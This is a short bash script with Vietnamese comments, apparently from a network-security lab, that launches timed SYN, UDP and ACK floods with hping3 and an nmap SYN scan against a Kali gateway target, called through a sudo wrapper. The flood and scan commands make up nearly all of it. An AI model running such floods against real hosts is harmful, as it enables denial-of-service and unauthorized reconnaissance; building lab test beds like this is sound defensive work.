#!/usr/bin/env bash
# ==============================================================================
# attack_runner.sh - Chạy thật kịch bản tấn công (chỉ gọi bởi attack_wrapper.sh,
# qua sudo -n, KHÔNG gọi trực tiếp). Tham số đã được attack_wrapper.sh kiểm tra.
#   $1 CMD   : SYN | UDP | ACK | SCAN
#   $2 TARGET: IP của Gateway Kali (mục tiêu)
#   $3 PORT  : cổng đích
#   $4 SECS  : số giây (đã giới hạn <= 60)
# ==============================================================================
set -u
CMD="$1"; TARGET="$2"; PORT="$3"; SECS="$4"

case "$CMD" in
  SYN)  exec timeout "${SECS}s" hping3 -S -p "$PORT" --flood "$TARGET" ;;
  UDP)  exec timeout "${SECS}s" hping3 --udp -d 512 -p "$PORT" --flood "$TARGET" ;;
  ACK)  exec timeout "${SECS}s" hping3 -A -p "$PORT" --flood "$TARGET" ;;
  SCAN) exec timeout "${SECS}s" nmap -sS -T4 -p 1-100 "$TARGET" ;;
  *) echo "unknown command: $CMD" >&2; exit 1 ;;
esac
